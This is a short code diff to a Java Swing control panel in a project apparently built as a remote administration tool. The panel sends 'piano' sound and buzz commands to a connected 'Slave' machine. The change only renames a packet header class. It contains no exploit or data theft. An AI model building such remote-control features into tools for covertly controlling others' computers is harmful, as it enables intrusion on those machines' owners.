@@ -23,8 +23,8 @@ import javax.swing.SpinnerNumberModel;
 import com.redpois0n.ErrorDialog;
 import com.redpois0n.Piano;
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 @SuppressWarnings("serial")
 public class PanelControlPiano extends PanelControlParent {
@@ -202,7 +202,7 @@ public class PanelControlPiano extends PanelControlParent {
 		JButton btnSend = new JButton("Send");
 		btnSend.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				slave.addToSendQueue(new PacketBuilder(Header.SEND_PIANO, new Integer[] { (Integer) spinnerSound.getValue(), (Integer) spinnerSec.getValue() }));
+				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.SEND_PIANO, new Integer[] { (Integer) spinnerSound.getValue(), (Integer) spinnerSec.getValue() }));
 			}
 		});
 		btnSend.setIcon(new ImageIcon(PanelControlPiano.class.getResource("/icons/right.png")));
@@ -251,6 +251,6 @@ public class PanelControlPiano extends PanelControlParent {
 			}
 		}
 
-		slave.addToSendQueue(new PacketBuilder(Header.PIANO, new String[] { i + "", chckbxActivateBuzz.isSelected() + "" }));
+		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.PIANO, new String[] { i + "", chckbxActivateBuzz.isSelected() + "" }));
 	}
 }
